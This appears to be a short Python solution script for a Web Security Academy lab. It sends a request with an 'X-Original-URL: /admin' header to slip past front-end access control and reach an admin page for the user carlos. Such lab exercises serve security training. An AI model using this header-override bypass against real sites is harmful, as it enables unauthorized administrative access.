import requests

site = '0a9200b003b099e281a5434700650075.web-security-academy.net'

s = requests.Session()

url = f'https://{site}/?username=carlos'
resp = s.get(url, headers = {'X-Original-URL': '/admin'})
print(resp.text)